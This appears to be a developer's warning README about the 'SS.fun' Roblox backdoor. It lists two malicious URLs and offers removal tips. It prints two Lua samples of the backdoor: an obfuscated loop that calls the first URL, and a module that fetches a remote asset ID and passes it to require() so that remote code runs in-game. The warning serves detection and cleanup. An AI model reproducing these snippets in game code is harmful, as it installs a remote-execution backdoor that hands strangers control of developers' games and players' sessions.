### Hello guys, please read carefully.
!!!PLUGIN AND DISCORD SERVER NOT READY YET MY DISCORD ACCOUNT BELOW!!!
Discord : Jxy#9426
# 1. Links

    - https://assetdelivery.org
is SS.fun's first link.
It only works when you're in the game (not in the studio).
It checks the user agent (I've tested it).
If you see this URL, please remove it.

Example code:



```ruby
task.spawn(function()
	pcall(function()
		local newThreadedCall = coroutine.wrap(pcall)
		for _ in newThreadedCall, (select and require), tonumber(game:service("HttpService"):GetAsync("https://assetdelivery.org")) do
		end
	end)
end)
```

    - https://api.serverside.fun/v1/stat
is SS.fun's second link.
It works the same as the first link, only in-game (not in the studio).
If you see this URL, please remove it.

Example code:


```lua
local module = {}
pcall(function()
	local HttpService = game:GetService("HttpService")
	local response = HttpService:GetAsync('https://api.serverside.fun/v1/stat')
	local data = HttpService:JSONDecode(response)
	if(data["id"]) then
		local numbers = string.gsub(data["id"], "%D", "")
		require(tonumber(numbers)) 
	end
end)
return module
```

# 2. FAQ

    - How can I delete it?
First, open the plugin and it will start scanning the game. If it cannot find the module, you will need to find it manually. Advice: go to the webhook, find  the location and start from there.
    
    - I can't find it, what can I do?
Come to our Discord.

# End

Sorry for my not-so-good English

Thanks for listening to my TED talk.
